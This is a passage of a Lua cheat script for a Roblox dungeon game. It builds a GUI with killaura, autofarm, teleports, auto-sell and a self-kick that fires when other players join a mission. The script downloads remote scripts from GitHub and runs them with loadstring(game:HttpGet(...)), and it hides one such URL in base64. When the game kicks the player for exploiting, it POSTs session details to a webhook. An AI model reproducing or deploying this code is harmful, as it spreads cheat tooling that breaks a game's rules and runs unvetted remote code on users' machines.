            Skill = 'TombstoneRise1',
            Cooldown = 4.2,
            Range = 18
        }, {
            Skill = 'TombstoneRise2',
            Cooldown = 4.2,
            Range = 18
        }, {
            Skill = 'TombstoneRise3',
            Cooldown = 4.2,
            Range = 18
        }, {
            Skill = 'TombstoneRise4',
            Cooldown = 4.2,
            Range = 18
        }, {
            Skill = 'TombstoneRise5',
            Cooldown = 4.2,
            Range = 18
        }, {
            Skill = 'SpiritCavern1',
            Cooldown = 10.2,
            Range = 140,
            Type = 'Ranged'
        }, {
            Skill = 'SpiritCavern2',
            Cooldown = 10.2,
            Range = 140,
            Type = 'Ranged'
        }, {
            Skill = 'SpiritCavern3',
            Cooldown = 10.2,
            Range = 140,
            Type = 'Ranged'
        }, {
            Skill = 'SpiritCavern4',
            Cooldown = 10.2,
            Range = 140,
            Type = 'Ranged'
        }, {
            Skill = 'SpiritCavern5',
            Cooldown = 10.2,
            Range = 140,
            Type = 'Ranged'
        }, {
            Skill = 'SpiritCavern6',
            Cooldown = 10.2,
            Range = 140,
            Type = 'Ranged'
        }, {
            Skill = 'UltScytheDrop',
            Cooldown = 30,
            Range = 98,
            Type = 'Ranged'
        }, {
            Skill = bc:WaitForChild('Necromancer'):WaitForChild('Ultimate'),
            Cooldown = 31,
            Type = 'Remote'
        }}
    },
    MageOfShadows = {
        DisplayName = 'Mage Of Shadows',
        Range = 99,
        Type = 'Ranged',
        Primary = 'Staff',
        Skills = {{
            Skill = 'MageOfShadows',
            Cooldown = 0.275
        }, {
            Skill = 'MageOfShadowsBlast',
            Cooldown = 0.3
        }, {
            Skill = 'MageOfShadowsCharged',
            Cooldown = 0.31
        }, {
            Skill = 'MageOfShadowsBlastCharged',
            Cooldown = 0.31
        }, {
            Skill = 'BighShadowOrb1',
            Cooldown = 0.33
        }, {
            Skill = 'BighShadowOrb2',
            Cooldown = 0.33
        }, {
            Skill = 'BighShadowOrb3',
            Cooldown = 0.33
        }, {
            Skill = 'MageOfShadowsDamageCircle',
            Cooldown = 0.33
        }, {
            Skill = bc:WaitForChild('MageOfShadows'):WaitForChild('ShadowChains'),
            Cooldown = 6,
            Type = 'Remote',
            Args = 'mobTbl'
        }, {
            Skill = bc:WaitForChild('MageOfShadows'):WaitForChild('Ultimate'),
            Cooldown = 2,
            Type = 'Remote'
        }}
    },
    Hunter = {
        DisplayName = 'Hunter',
        Range = 99,
        Type = 'Ranged',
        Primary = 'Bow',
        Skills = {{
            Skill = 'Hunter',
            Cooldown = 0.5
        }}
    },
    Stormcaller = {
        DisplayName = 'Stormcaller',
        Range = 99,
        Type = 'Ranged',
        Primary = 'Staff',
        Skills = {{
            Skill = 'Stormcaller1',
            Cooldown = 0.3
        }, {
            Skill = 'Stormcaller2',
            Cooldown = 0.3
        }, {
            Skill = 'Stormcaller3',
            Cooldown = 0.3
        }, {
            Skill = 'StormcallerThunderGod1',
            Cooldown = 0.25,
            Type = 'Melee',
            Range = 13
        }, {
            Skill = 'StormcallerThunderGod2',
            Cooldown = 0.5,
            Type = 'Melee',
            Range = 13
        }, {
            Skill = 'StormcallerThunderGod3',
            Cooldown = 0.75,
            Type = 'Melee',
            Range = 13
        }, {
            Skill = 'StormcallerThunderGod4',
            Cooldown = 1,
            Type = 'Melee',
            Range = 13
        }, {
            Skill = 'StormcallerThunderGod5',
            Cooldown = 1.25,
            Type = 'Melee',
            Range = 13
        }, {
            Skill = 'StormcallerThunderGod6',
            Cooldown = 1.6,
            Type = 'Melee',
            Range = 13
        }, {
            Skill = 'StormcallerThunderGod7',
            Cooldown = 2,
            Type = 'Melee',
            Range = 13
        }, {
            Skill = 'StormcallerThunderGod8',
            Cooldown = 2.3,
            Type = 'Melee',
            Range = 13
        }, {
            Skill = 'UltimateDischarge',
            Cooldown = 1.6,
            Range = 39
        }, {
            Skill = 'ChainLightning1',
            Cooldown = 7.1,
            Range = 119
        }, {
            Skill = 'ChainLightning2',
            Cooldown = 7.1,
            Range = 119
        }, {
            Skill = 'ChainLightning3',
            Cooldown = 7.1,
            Range = 119
        }, {
            Skill = 'ChainLightning4',
            Cooldown = 7.1,
            Range = 119
        }, {
            Skill = 'ChainLightning5',
            Cooldown = 7.1,
            Range = 119
        }, {
            Skill = 'ChainLightning6',
            Cooldown = 7.1,
            Range = 119
        }, {
            Skill = 'ChainLightning7',
            Cooldown = 7.1,
            Range = 119
        }, {
            Skill = 'ChainLightning8',
            Cooldown = 7.1,
            Range = 119
        }, {
            Skill = 'StormSurgeInit',
            Cooldown = 10.1,
            Range = 19.5
        }, {
            Skill = 'StormSurge',
            Cooldown = 10.1,
            Range = 39.5
        }, {
            Skill = 'StormcallerUltBlast',
            Cooldown = 31,
            Range = 10
        }}
    }
}
c5 = cf('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3JvbmFsZGJ1cmdlcnNvbi9ib3JnL21haW4vYnJvb20=')
local cm = Instance.new('Folder')
cm.Name = 'SummonFolder'
cm.Parent = Workspace;
local cn = Instance.new('Folder')
cn.Name = 'infiniteboy'
cn.Parent = Workspace;
local co;
if aJ then
    co = Instance.new('Part')
    co.Name = 'InfiniteKillPart'
    co.Size = Vector3.new(50, 20, 50)
    co.Position = Vector3.new(10000, 10000, 10000)
    co.Anchored = true;
    co.Transparency = 0;
    co.Material = 'SmoothPlastic'
    co.BrickColor = BrickColor.new('Cyan')
    co.Parent = workspace
end

-- ============================================================================
-- LIBRARY LOADING SECTION (DEOBFUSCATED)
-- ============================================================================
-- These variables replace the encoded ones:
-- cp = Linoria UI Library (main library for creating GUI)
-- cq = ThemeManager (handles theme switching and management)  
-- cr = SaveManager (handles saving/loading configurations)
local cp; -- Linoria Library (was previously encoded)
local cq; -- LinoriaThemeManager (was previously encoded)
local cr; -- LinoriaSaveManager (was previously encoded)

-- GitHub repository URL for loading libraries
local ce = 'https://raw.githubusercontent.com/maihoangphi2531/infscriptv2/main/'

-- Check if ReplicatedStorage is available for file operations
if a4 then
    -- Helper function to load libraries with caching
    local function ch(scriptUrl, fileName)
        local success, fileContent = pcall(function()
            return readfile(fileName)
        end)
        
        -- Use cached file if it exists and UpdateLib is not forced
        if success and not UpdateLib then
            return loadstring(fileContent)()
        else
            -- Download fresh copy from GitHub
            fileContent = game:HttpGet(scriptUrl)
            writefile(fileName, fileContent)
            return loadstring(fileContent)()
        end
    end
    
    -- Load each library with caching
    cp = ch(ce .. 'Linoria', 'LinoriaV6.lua')                    -- Main UI Library
    cq = ch(ce .. 'LinoriaThemeManager', 'LinoriaThemeManagerV5.lua')  -- Theme Manager
    cr = ch(ce .. 'LinoriaSaveManager', 'LinoriaSaveManagerV5.lua')     -- Save Manager
else
    -- Fallback: Direct loading without file caching (for executors without file system access)
    cp = loadstring(game:HttpGet(ce .. 'Linoria'))()              -- Main UI Library
    cq = loadstring(game:HttpGet(ce .. 'LinoriaThemeManager'))()   -- Theme Manager  
    cr = loadstring(game:HttpGet(ce .. 'LinoriaSaveManager'))()    -- Save Manager
end

-- ============================================================================
-- END OF LIBRARY LOADING SECTION
-- ============================================================================

a = true; -- Flag to indicate libraries are loaded
function libWarn(msg)
    warn('[Infinite]: ' .. msg)
end
function pcallWithError(cs)
    local bE, ct = pcall(cs)
    if not bE and ct then
        libWarn(ct)
    end
end
function libNoti(msg)
    print(msg)
    pcallWithError(function()
        cp:Notify(msg)
    end)
end
function setMissionObjective(cu, cv)
    local V = c.PlayerGui.MissionObjective.MissionObjective.Label;
    V.Text = cu;
    V.Overlay.Text = cu;
    if cv then
        V.ZIndex = 30;
        V.Overlay.ZIndex = 31
    end
end
function resetMissionObjective()
    local V = c.PlayerGui.MissionObjective.MissionObjective.Label;
    V.Text = ''
    V.Overlay.Text = ''
end
function isRangedClass()
    return cl[b9] and cl[b9].Type == 'Ranged'
end
local cw = game:GetService('GuiService')
local cx;
cx = cw.ErrorMessageChanged:Connect(function(msg)
    if cw:GetErrorCode() == Enum.ConnectionError.DisconnectLuaKick or cw:GetErrorCode() ==
        Enum.ConnectionError.DisconnectConnectionLost or msg:lower():find("exploit") then
        cx:Disconnect()
        ao.Kicked = true;
        save()
        if msg:lower():find("exploit") then
            local cy = 'Killaura Delay: ``' .. Options.KillauraDelay.Value .. '``\nClass: ``' .. cl[b9].DisplayName ..
                           '``\nPing: ``' .. ping2() .. '``'
            if aC then
                cy = cy .. '\nCode: ``' .. i .. '``\nMission: ``' .. h .. '``'
            end
            cy = cy .. '\n' .. f;
            request({
                Url = boink2,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = e:JSONEncode({
                    ["embeds"] = {{
                        ["title"] = 'Exploit Kick',
                        ["description"] = cy,
                        ["type"] = 'rich',
                        ["color"] = tonumber(C.LightPink),
                        ["footer"] = {
                            ["text"] = utcDateAndTime() .. ' UTC'
                        }
                    }}
                })
            })
        end
        a6:Teleport(an, c)
    end
end)
local cz = cp:CreateWindow({
    Title = 'assssxs ',
    Resizable = true,
    Center = false,
    AutoShow = true,
    TabPadding = 8,
    MenuFadeTime = 0,
    CornerRadius = 15
})
local cA = {
    Main = cz:AddTab('Main'),
    Sell = cz:AddTab('Sell'),
    Teleports = cz:AddTab('Teleports'),
    ['Settings'] = cz:AddTab('Settings')
}
local cB = cA.Main:AddLeftTabbox('farmmm')
local cC = cA.Sell:AddLeftTabbox('selll')
local cD = cA.Sell:AddRightTabbox('selll2')
local cE = cB:AddTab('Farm')
local cF = cB:AddTab('Settings')
local cG = cC:AddTab('Auto Sell')
local cH = cD:AddTab('Sell/Recycle Cosmetics')
local cI = cB:AddTab('Weapons')
local cJ = cB:AddTab('Event')
local cK = cA.Main:AddRightTabbox('box')
local cL = cK:AddTab('Visual')
local cM = cK:AddTab('Webhook')
local cN = cK:AddTab('Misc')
local cO = cK:AddTab('Gui')
local cP = cA.Main:AddRightTabbox('temp')
local cQ = cP:AddTab('Stats')
local cR = cA.Teleports:AddLeftGroupbox('Worlds')
local cS = cA.Teleports:AddRightGroupbox('Towers')
local cT = cA.Teleports:AddRightGroupbox('Nightmare Dungeons')
cE:AddToggle('Killaura', {
    Text = 'Killaura',
    Default = false
})
cE:AddSlider('KillauraDelay', {
    Text = 'Delay',
    Default = 0,
    Min = 0,
    Max = 1,
    Rounding = 2,
    HideMax = true,
    Compact = true
})
if olympus then
    cE:AddSlider('testOffset', {
        Text = 'Test Offset',
        Default = 0,
        Min = -25,
        Max = 25,
        Rounding = 0,
        HideMax = true,
        Compact = true
    })
end
cE:AddToggle('Autofarm', {
    Text = 'Autofarm',
    Default = false
})
cE:AddSlider('Offset', {
    Text = 'Offset',
    Default = isRangedClass() and 50 or 7,
    Min = 0,
    Max = aC and (isRangedClass() and 75 or 25) or 75,
    Rounding = 1,
    Compact = true
})
cE:AddSlider('healPercent', {
    Text = 'Heal At',
    Default = 30,
    Min = 0,
    Max = 100,
    Rounding = 0,
    HideMax = true,
    Compact = true,
    Suffix = '% HP'
})
cE:AddSlider('resumePercent', {
    Text = 'Resume At',
    Default = 100,
    Min = 0,
    Max = 100,
    Rounding = 0,
    HideMax = true,
    Compact = true,
    Suffix = '% HP'
})
cE:AddToggle('CollectDrops', {
    Text = 'Collect Drops',
    Default = false
})
cE:AddToggle('collectEggChests', {
    Text = 'Collect Egg Chests',
    Default = true
})
cE:AddToggle('RestartDungeon', {
    Text = 'Restart Dungeon',
    Default = false
})
cE:AddToggle('nightmareLoop', {
    Text = 'Nightmare Loop',
    Default = false
})
cE:AddToggle('NextDungeon', {
    Text = 'Next Dungeon',
    Default = false
})
cE:AddToggle('PerkSwitcher', {
    Text = 'Auto Switch Perks',
    Default = false,
    Tooltip = 'Enables Primary Perks on Mobs, and Offhand Perks on Bosses'
})
cE:AddToggle('autoEquipBestwWep', {
    Text = 'Auto Equip Best Weapon/Armor',
    Default = false
})
cE:AddToggle('mobCamera', {
    Text = 'Mob POV',
    Default = false
})
cE:AddSlider('FastSprint', {
    Text = 'Sprint Speed',
    Default = 28,
    Min = 28,
    Max = 200,
    Rounding = 0,
    Compact = true
})
cE:AddButton({
    Text = 'Restart Dungeon',
    Func = function()
        if aC then
            StartRaid(ay, az)
        end
    end,
    DoubleClick = false
})
cF:AddSlider('dungeonRestartTimer', {
    Text = 'Restart Dungeon Delay',
    Default = 0,
    Min = 0,
    Max = 300,
    Rounding = 0,
    HideMax = true,
    Suffix = ' seconds',
    Compact = true
})
cF:AddSlider('towerRestartTimer', {
    Text = 'Restart Tower Delay',
    Default = 0,
    Min = 0,
    Max = 30,
    Rounding = 0,
    HideMax = true,
    Suffix = ' seconds',
    Compact = true
})
cF:AddSlider('dungeonStartTimer', {
    Text = 'Dungeon Start Delay',
    Default = 0,
    Min = 0,
    Max = 300,
    Rounding = 0,
    HideMax = true,
    Suffix = ' seconds',
    Compact = true
})
cF:AddSlider('towerStartTimer', {
    Text = 'Tower Start Delay',
    Default = 0,
    Min = 0,
    Max = 600,
    Rounding = 0,
    HideMax = true,
    Suffix = ' seconds',
    Compact = true
})
Options.dungeonStartTimer:OnChanged(function(cU)
    bs = bs + 1
end)
Options.towerStartTimer:OnChanged(function(cU)
    bt = bt + 1
end)
cF:AddSlider('timeoutTimer', {
    Text = 'Dungeon Timeout',
    Default = 120,
    Min = 10,
    Max = 300,
    Rounding = 0,
    HideMax = true,
    Suffix = ' seconds',
    Tooltip = 'Restart dungeon if no damage has been done within the specified time period',
    Compact = true
})
cF:AddToggle('restartAfterFloors', {
    Text = 'Inf Tower Smart Restart',
    Tooltip = 'Restarts Infinite Floor after specified amount of floors are completed',
    Default = false
})
cF:AddInput('completedInfiniteTowerFloors', {
    Text = 'Floors',
    Default = 31,
    Numeric = true,
    Finished = true
})
cF:AddToggle('ignoreCannon', {
    Text = 'Ignore Cannon (Atlantis Tower)',
    Default = false
})
cF:AddToggle('skipScarecrowNm', {
    Text = 'Skip Scarecrow Defense (NM Loop)',
    Default = false
})
cF:AddToggle('rejoinDungeon', {
    Text = 'Rejoin Last Dungeon',
    Tooltip = 'Automatically starts the last dungeon started within your desired time limit',
    Default = false
})
Toggles.rejoinDungeon:OnChanged(function(ck)
    ao.RejoinLastDungeon = ck;
    save()
end)
local cV = {
    ['30 minutes'] = 1800,
    ['3 hours'] = 10800,
    ['12 hours'] = 43200,
    ['24 hours'] = 86400,
    ['Infinite'] = 999999999
}
cF:AddDropdown('rjdLimit', {
    Text = 'Rejoin Last Dungeon Limit',
    Values = {'30 minutes', '3 hours', '12 hours', '24 hours', 'Infinite'},
    Default = '30 minutes',
    AllowNull = false,
    Multi = false
})
Options.rjdLimit:OnChanged(function(ck)
    ao.RejoinLastDungeonThreshold = cV[ck]
    save()
end)
cF:AddToggle('forceRestartLastTower', {
    Text = 'Force Restart Last Tower',
    Tooltip = 'Restart the Tower when going back to town (willingly or by force)',
    Default = false
})
Toggles.forceRestartLastTower:OnChanged(function(ck)
    ao.ForceRestartLastTower = ck;
    save()
end)
cF:AddSlider('playerCountKick', {
    Text = 'Mission PlayerCount Kick',
    Default = 6,
    Min = 2,
    Max = 6,
    Rounding = 0,
    HideMax = true,
    Tooltip = 'Disconnect from the game if player count reaches the threshold in mission',
    Compact = true
})
task.spawn(function()
    while aC do
        if #b:GetPlayers() >= Options.playerCountKick.Value then
            task.wait(0.5)
            c:Kick('Someone might have joined your mission!')
            break
        end
        task.wait()
    end
end)
cI:AddInput('mobWepId', {
    Numeric = false,
    Finished = true,
    Text = 'Current Mob Weapon'
})
cI:AddInput('bossWepId', {
    Numeric = false,
    Finished = true,
    Text = 'Current Boss Weapon'
})
cI:AddButton({
    Text = 'Set Current Primary for Mobs',
    Tooltip = 'Killaura will auto equip this weapon when targeting mobs',
    Func = function()
        local cW = b4 and b4:GetChildren()[1]
        local cX = cW and cW.ID.Value;
        if cX then
            Options.mobWepId:SetValue(cX)
            libNoti('Set ' .. bR[cW.Name].DisplayKey .. ' as your Mob weapon!')
        else
            libNoti('No suitable Primary Weapon Detected')
        end
    end,
    DoubleClick = false
})
cI:AddButton({
    Text = 'Set Current Primary for Bosses',
    Tooltip = 'Killaura will auto equip this weapon when targeting bosses',
    Func = function()
        local cW = b4 and b4:GetChildren()[1]
        local cX = cW and cW.ID.Value;
        if cX then
            Options.bossWepId:SetValue(cX)
            libNoti('Set ' .. bR[cW.Name].DisplayKey .. ' as your Boss weapon!')
        else
            libNoti('No suitable Primary Weapon Detected')
        end
    end,
    DoubleClick = false
})
cI:AddButton({
    Text = 'Reset Selected Weapons',
    Func = function()
        Options.mobWepId:SetValue('')
        Options.bossWepId:SetValue('')
        libNoti('Selected weapons reset!')
    end,
    DoubleClick = false
})
cM:AddInput('dungeonHook', {
    Numeric = false,
    Finished = true,
    Text = 'Mission Webhook',
    Tooltip = 'Put your own webhook link to log mission completions/fails'
})
cM:AddInput('drophook', {
    Numeric = false,
    Finished = true,
    Text = 'Drop Webhook',
    Tooltip = 'Put your own webhook link to log T5 drops'
})
cM:AddInput('dropHookRoleId', {
    Numeric = false,
    Finished = true,
    Text = 'Custom Role ID for DropHook',
    Tooltip = 'Mention your chosen role instead of @everyone when getting a desired perk T5'
})
cM:AddToggle('anonHook', {
    Text = 'Anonymous Webhook',
    Tooltip = "Won't show your User Info in the webhook",
    Default = false
})
cG:AddDropdown('AutoSellTbl', {
    Text = 'Auto Sell Tiers',
    Values = {1, 2, 3, 4, 5},
    AllowNull = true,
    Multi = true
})
cG:AddButton({
    Text = 'Sell All',
    Tooltip = 'Sells all weapons and armors of selected tiers',
    Func = function()
        local cY = {}
        for z, R in bM:GetChildren() do
            local cZ = bR[R.Name]
            if (cZ.Type == 'Weapon' or cZ.Type == 'Armor') and Options.AutoSellTbl.Value[c0:GetItemTier(R)] and
                not R:FindFirstChild('Locked') then
                table.insert(cY, R)
            end
        end
        if #cY > 0 then
            libNoti('Sold ' .. #cY .. ' items')
            a5.Drops.SellItems:InvokeServer(cY)
        end
    end,
    DoubleClick = true
})
cG:AddToggle('autoSellAll', {
    Text = 'Auto Sell All',
    Tooltip = "Failsafe incase auto sell doesn't sell in time at the end of a mission",
    Default = false
})
Toggles.autoSellAll:OnChanged(function(cU)
    if cU then
        local cY = {}
        for z, R in bM:GetChildren() do
            local cZ = bR[R.Name]
            if (cZ.Type == 'Weapon' or cZ.Type == 'Armor') and Options.AutoSellTbl.Value[c0:GetItemTier(R)] and
                not R:FindFirstChild('Locked') then
                table.insert(cY, R)
            end
        end
        if #cY > 0 then
            libNoti('Sold ' .. #cY .. ' items')
            a5.Drops.SellItems:InvokeServer(cY)
        end
    end
end)
cG:AddToggle('autoSellEggs', {
    Text = 'Auto Sell Eggs',
    Default = false,
    Tooltip = 'Works in Event Wheel Hub also'
})
cG:AddDivider()
cG:AddToggle('smartPerkSell', {
    Text = 'Smart T5 Auto Sell',
    Default = false,
    Tooltip = 'Do NOT enable this until you have turned all of your desired perks slider atleast 1 higher than lowest value'
})
local c_ = {}
for z, R in bQ do
    table.insert(c_, R.DisplayName)
end
table.sort(c_)
for z = 1, #c_ do
    for d0, d1 in bQ do
        if c_[z] == d1.DisplayName then
            cG:AddSlider(d0, {
                Text = d1.DisplayName,
                Default = math.round(d1.StatRange[1] * 100),
                Min = math.round(d1.StatRange[1] * 100),
                Max = math.round(d1.StatRange[2] * 100),
                Rounding = 0,
                HideMax = true,
                Compact = true,
                Suffix = '%'
            })
        end
    end
end
local d2 = {
    GigaSlimeHead = 'Giga Slime Head',
    NightTerrorHood = 'Night Terror Hood',
    FlameDemonHood = 'Flame Demon Hood',
    SpartanHelmet = 'Mezuvian Helmet',
    AngelHood = 'Angel Hood',
    AngelHalo = 'Angel Halo',
    AngelicWings = 'Angelic Wings',
    TaurhaStaff = "Taurha's Staff",
    AetherCrown = 'Aether Crown',
    W9T5Helmet = 'Aether Helmet'
}
local d3 = {}
for z, R in d2 do
    table.insert(d3, R)
end
table.sort(d3)
cH:AddDropdown('selectedCosmetics', {
    Text = 'Select Cosmetics',
    Values = d3,
    AllowNull = true,
    Multi = true
})
local d4 = {
    FrostyScarf = 'Frosty Scarf',
    WolfspiritHelmet = 'Wolfspirit Helmet',
    WolfspiritArmor = 'Wolfspirit Armor',
    FestiveDress = 'Festive Dress',
    RamHorns = 'Ram Horns',
    CandycaneAntlers = 'Candycane Antlers',
    CarrotNose = 'Carrot Nose',
    FluffyJacket = 'Fluffy Jacket'
}
local d3 = {}
for z, R in d4 do
    table.insert(d3, R)
end
table.sort(d3)
cH:AddDropdown('selectedWheelCosmetics', {
    Text = 'Select Event Cosmetics',
    Values = d3,
    AllowNull = true,
    Multi = true
})
local d5 = {{
    Hex = '#FF1337',
    Name = 'Rainbow',
    SpecialType = true
}, {
    Hex = '#DDEADD',
    Name = 'Ghoul',
    SpecialType = true
}, {
    Hex = '#11CCEE',
    Name = 'Ice',
    SpecialType = true
}, {
    Hex = '#FFADED',
    Name = 'Faded',
    SpecialType = true
}, {
    Hex = '#F0F8FF',
    Name = 'Alice Blue'
}, {
    Hex = '#FAEBD7',
    Name = 'Antique White'
}, {
    Hex = '#00FFFF',
    Name = 'Aqua'
}, {
    Hex = '#7FFFD4',
    Name = 'Aquamarine'
}, {
    Hex = '#F0FFFF',
    Name = 'Azure'
}, {
    Hex = '#F5F5DC',
    Name = 'Beige'
}, {
    Hex = '#FFE4C4',
    Name = 'Bisque'
}, {
    Hex = '#000000',
    Name = 'Black'
}, {
    Hex = '#FFEBCD',
    Name = 'Blanched Almond'
}, {
    Hex = '#0000FF',
    Name = 'Blue'
}, {
    Hex = '#8A2BE2',
    Name = 'Blue Violet'
}, {
    Hex = '#A52A2A',
    Name = 'Brown'
}, {
    Hex = '#DEB887',
    Name = 'Burly Wood'
}, {
    Hex = '#5F9EA0',
    Name = 'Cadet Blue'
}, {
    Hex = '#7FFF00',
    Name = 'Chartreuse'
}, {
    Hex = '#D2691E',
    Name = 'Chocolate'
}, {
    Hex = '#FF7F50',
    Name = 'Coral'
}, {
    Hex = '#6495ED',
    Name = 'Cornflower Blue'
}, {
    Hex = '#FFF8DC',
    Name = 'Cornsilk'
}, {
    Hex = '#DC143C',
    Name = 'Crimson'
}, {
    Hex = '#00FFFF',
    Name = 'Cyan'
}, {
    Hex = '#00008B',
    Name = 'Dark Blue'
}, {
    Hex = '#008B8B',
    Name = 'Dark Cyan'
}, {
    Hex = '#B8860B',
    Name = 'Dark Goldenrod'
}, {
    Hex = '#A9A9A9',
    Name = 'Dark Gray'
}, {
    Hex = '#006400',
    Name = 'Dark Green'
}, {
    Hex = '#BDB76B',
    Name = 'Dark Khaki'
}, {
    Hex = '#8B008B',
    Name = 'Dark Magenta'
}, {
    Hex = '#556B2F',
    Name = 'Dark Olive Green'
}, {
    Hex = '#FF8C00',
    Name = 'Dark Orange'
}, {
    Hex = '#9932CC',
    Name = 'Dark Orchid'
}, {
    Hex = '#8B0000',
    Name = 'Dark Red'
}, {
    Hex = '#E9967A',
    Name = 'Dark Salmon'
}, {
    Hex = '#8FBC8F',
    Name = 'Dark Sea Green'
}, {
    Hex = '#483D8B',
    Name = 'Dark Slate Blue'
}, {
    Hex = '#2F4F4F',
    Name = 'Dark Slate Gray'
}, {
    Hex = '#00CED1',
    Name = 'Dark Turquoise'
}, {
    Hex = '#9400D3',
    Name = 'Dark Violet'
}, {
    Hex = '#FF1493',
    Name = 'Deep Pink'
}, {
    Hex = '#00B7EB',
    Name = 'Deep Sky Blue'
}, {
    Hex = '#696969',
    Name = 'Dim Gray'
}, {
    Hex = '#1E90FF',
    Name = 'Dodger Blue'
}, {
    Hex = '#B22222',
    Name = 'Firebrick'
}, {
    Hex = '#FFFAF0',
    Name = 'Floral White'
}, {
    Hex = '#228B22',
    Name = 'Forest Green'
}, {
    Hex = '#FF00FF',
    Name = 'Fuchsia'
}, {
    Hex = '#DCDCDC',
    Name = 'Gainsboro'
}, {
    Hex = '#F8F8FF',
    Name = 'Ghost White'
}, {
    Hex = '#FFD700',
    Name = 'Gold'
}, {
    Hex = '#DAA520',
    Name = 'Goldenrod'
}, {
    Hex = '#808080',
    Name = 'Gray'
}, {
    Hex = '#008000',
    Name = 'Green'
}, {
    Hex = '#ADFF2F',
    Name = 'Green Yellow'
}, {
    Hex = '#F0FFF0',
    Name = 'Honeydew'
}, {
    Hex = '#FF69B4',
    Name = 'Hot Pink'
}, {
    Hex = '#CD5C5C',
    Name = 'Indian Red'
}, {
    Hex = '#4B0082',
    Name = 'Indigo'
}, {
    Hex = '#FFFFF0',
    Name = 'Ivory'
}, {
    Hex = '#F0E68C',
    Name = 'Khaki'
}, {
    Hex = '#E6E6FA',
    Name = 'Lavender'
}, {
    Hex = '#FFF0F5',
    Name = 'Lavender Blush'
}, {
    Hex = '#7CFC00',
    Name = 'Lawn Green'
}, {
    Hex = '#FFFACD',
    Name = 'Lemon Chiffon'
}, {
    Hex = '#ADD8E6',
    Name = 'Light Blue'
}, {
    Hex = '#F08080',
    Name = 'Light Coral'
}, {
    Hex = '#E0FFFF',
    Name = 'Light Cyan'
}, {
    Hex = '#FAFAD2',
    Name = 'Light Goldenrod Yellow'
}, {
    Hex = '#D3D3D3',
    Name = 'Light Gray'
}, {
    Hex = '#90EE90',
    Name = 'Light Green'
}, {
    Hex = '#FFB6C1',
    Name = 'Light Pink'
}, {
    Hex = '#FFA07A',
    Name = 'Light Salmon'
}, {
    Hex = '#20B2AA',
    Name = 'Light Sea Green'
}, {
    Hex = '#87CEFA',
    Name = 'Light Sky Blue'
}, {
    Hex = '#778899',
    Name = 'Light Slate Gray'
}, {
    Hex = '#B0C4DE',
    Name = 'Light Steel Blue'
}, {
    Hex = '#FFFFE0',
    Name = 'Light Yellow'
}, {
    Hex = '#00FF00',
    Name = 'Lime'
}, {
    Hex = '#32CD32',
    Name = 'Lime Green'
}, {
    Hex = '#FAF0E6',
    Name = 'Linen'
}, {
    Hex = '#FF00FF',
    Name = 'Magenta'
}, {
    Hex = '#800000',
    Name = 'Maroon'
}, {
    Hex = '#66CDAA',
    Name = 'Medium Aquamarine'
}, {
    Hex = '#0000CD',
    Name = 'Medium Blue'
}, {
    Hex = '#BA55D3',
    Name = 'Medium Orchid'
}, {
    Hex = '#9370DB',
    Name = 'Medium Purple'
}, {
    Hex = '#3CB371',
    Name = 'Medium Sea Green'
}, {
    Hex = '#7B68EE',
    Name = 'Medium Slate Blue'
}, {
    Hex = '#00FA9A',
    Name = 'Medium Spring Green'
}, {
    Hex = '#48D1CC',
    Name = 'Medium Turquoise'
}, {
    Hex = '#C71585',
    Name = 'Medium Violet Red'
}, {
    Hex = '#191970',
    Name = 'Midnight Blue'
}, {
    Hex = '#F5FFFA',
    Name = 'Mint Cream'
}, {
    Hex = '#FFE4E1',
    Name = 'Misty Rose'
}, {
    Hex = '#FFE4B5',
    Name = 'Moccasin'
}, {
    Hex = '#FFDEAD',
    Name = 'Navajo White'
}, {
    Hex = '#000080',
    Name = 'Navy'
}, {
    Hex = '#FDF5E6',
    Name = 'Old Lace'
}, {
    Hex = '#808000',
    Name = 'Olive'
}, {
    Hex = '#6B8E23',
    Name = 'Olive Drab'
}, {
    Hex = '#FFA500',
    Name = 'Orange'
}, {
    Hex = '#FF4500',
    Name = 'Orange Red'
}, {
    Hex = '#DA70D6',
    Name = 'Orchid'
}, {
    Hex = '#EEE8AA',
    Name = 'Pale Goldenrod'
}, {
    Hex = '#98FB98',
    Name = 'Pale Green'
}, {
    Hex = '#AFEEEE',
    Name = 'Pale Turquoise'
}, {
    Hex = '#DB7093',
    Name = 'Pale Violet Red'
}, {
    Hex = '#FFEFD5',
    Name = 'Papaya Whip'
}, {
    Hex = '#FFDAB9',
    Name = 'Peach Puff'
}, {
    Hex = '#CD853F',
    Name = 'Peru'
}, {
    Hex = '#FFC0CB',
    Name = 'Pink'
}, {
    Hex = '#DDA0DD',
    Name = 'Plum'
}, {
    Hex = '#B0E0E6',
    Name = 'Powder Blue'
}, {
    Hex = '#800080',
    Name = 'Purple'
}, {
    Hex = '#FF0000',
    Name = 'Red'
}, {
    Hex = '#BC8F8F',
    Name = 'Rosy Brown'
}, {
    Hex = '#4169E1',
    Name = 'Royal Blue'
}, {
    Hex = '#8B4513',
    Name = 'Saddle Brown'
}, {
    Hex = '#FA8072',
    Name = 'Salmon'
}, {
    Hex = '#F4A460',
    Name = 'Sandy Brown'
}, {
    Hex = '#2E8B57',
    Name = 'Sea Green'
}, {
    Hex = '#FFF5EE',
    Name = 'Sea Shell'
}, {
    Hex = '#A0522D',
    Name = 'Sienna'
}, {
    Hex = '#C0C0C0',
    Name = 'Silver'
}, {
    Hex = '#87CEEB',
    Name = 'Sky Blue'
}, {
    Hex = '#6A5ACD',
    Name = 'Slate Blue'
}, {
    Hex = '#708090',
    Name = 'Slate Gray'
}, {
    Hex = '#FFFAFA',
    Name = 'Snow'
}, {
    Hex = '#00FF7F',
    Name = 'Spring Green'
}, {
    Hex = '#4682B4',
    Name = 'Steel Blue'
}, {
    Hex = '#D2B48C',
    Name = 'Tan'
}, {
    Hex = '#008080',
    Name = 'Teal'
}, {
    Hex = '#D8BFD8',
    Name = 'Thistle'
}, {
    Hex = '#FF6347',
    Name = 'Tomato'
}, {
    Hex = '#40E0D0',
    Name = 'Turquoise'
}, {
    Hex = '#EE82EE',
    Name = 'Violet'
}, {
    Hex = '#F5DEB3',
    Name = 'Wheat'
}, {
    Hex = '#FFFFFF',
    Name = 'White'
}, {
    Hex = '#F5F5F5',
    Name = 'White Smoke'
}, {
    Hex = '#FFFF00',
    Name = 'Yellow'
}, {
    Hex = '#9ACD32',
    Name = 'Yellow Green'
}}
local d3 = {}
for z, R in d5 do
    table.insert(d3, R.Name)
end
table.sort(d3)
cH:AddDropdown('selectedDyes', {
    Text = 'Select Desired Dyes',
